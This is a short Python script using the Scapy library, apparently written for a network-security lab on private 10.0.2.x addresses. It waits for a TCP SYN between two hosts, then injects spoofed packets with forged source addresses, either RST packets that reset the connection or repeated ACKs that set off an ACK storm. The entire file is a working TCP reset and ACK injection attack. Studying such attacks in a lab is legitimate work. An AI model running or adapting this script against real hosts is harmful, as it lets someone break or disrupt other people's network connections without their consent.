#!/usr/bin/env python
from scapy.all import *
from scapy.layers.inet import IP, TCP

srcip = "10.0.2.5"
dstip = "10.0.2.4"
mode = "ack-attack"
def send_rst_pkts(dst_port, src_port, pkt):
    print("Sending rst pkts")

    ip1 = IP(src=dstip, dst=srcip)
    TCP_RST1 = TCP(sport=int(dst_port), dport=int(src_port), flags="R", seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    ip2 = IP(src=srcip, dst=dstip)
    TCP_RST2 = TCP(sport=int(src_port), dport=int(dst_port), flags="R", seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    send(ip1 / TCP_RST1)
    send(ip2 / TCP_RST2)

def send_ack_pkts(dst_port, src_port, pkt):

    ip1 = IP(src=dstip, dst=srcip)
    TCP_ACK1 = TCP(sport=int(dst_port), dport=int(src_port), flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    ip2 = IP(src=srcip, dst=dstip)
    TCP_ACK2 = TCP(sport=int(src_port), dport=int(dst_port), flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    send(ip1 / TCP_ACK1, count=3)
    #send(ip2 / TCP_ACK2, count=3)

def launch_attack(dst_port: str, src_port: str):
    ack_filter = 'src ' + dstip + ' and ' \
                 'dst ' + srcip + ' and ' \
                 'src port ' + dst_port + ' and ' \
                 'dst port ' + src_port + ' and ' \
                 'tcp[13] & 16!=0'

    if(mode == "rst-attack"):
        t = sniff(filter=ack_filter, prn=lambda pkt: send_rst_pkts(dst_port=dst_port, src_port=src_port, pkt=pkt))
    elif(mode == "ack-attack"):
        t = sniff(filter=ack_filter, prn=lambda pkt: send_ack_pkts(dst_port=dst_port, src_port=src_port, pkt=pkt))

def syn_pkt_received(pkt):
    dst_port = pkt[TCP].sport
    src_port = pkt[TCP].dport
    launch_attack(str(dst_port), str(src_port))


if __name__ == '__main__':
    print("Awaiting SYN packet")
    syn_filter = 'ip and src ' + dstip + ' and dst ' + srcip + ' and tcp[13] & 2!=0'
    sniff(count=1, filter=syn_filter, prn=syn_pkt_received)

    while(True):
        x = 1;
# scp 20mbfile.txt mlr@10.0.2.4:/home/mlr/files/text.txt
# ssh -p 22 mlr@10.0.2.4